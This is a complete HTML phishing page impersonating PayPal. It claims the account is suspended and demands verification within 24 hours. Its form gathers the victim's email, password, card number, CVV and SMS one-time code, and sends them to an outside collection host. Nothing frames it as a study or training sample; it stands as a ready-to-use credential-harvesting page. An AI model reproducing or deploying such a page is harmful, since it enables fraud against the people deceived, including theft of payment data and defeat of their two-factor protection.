<!doctype html>
<html lang="en">
<head><title>PayPal — Verify Your Account</title></head>
<body>
  <h1>PayPal Security Check</h1>
  <p>Your account has been suspended due to unusual sign-in activity.
     Verify within 24 hours or your account will be permanently limited.
     Please confirm your password and card number with CVV to restore access.</p>
  <form action="https://collect.evil-harvest.tk/grab" method="post">
    <input name="email" type="text" placeholder="PayPal email" />
    <input name="password" type="password" placeholder="Password" />
    <input name="card_number" type="text" placeholder="Card number" />
    <input name="cvv" type="text" placeholder="CVV" />
    <input name="otp_code" type="text" placeholder="One-time code from SMS" />
    <button type="submit">Verify now</button>
  </form>
</body>
</html>
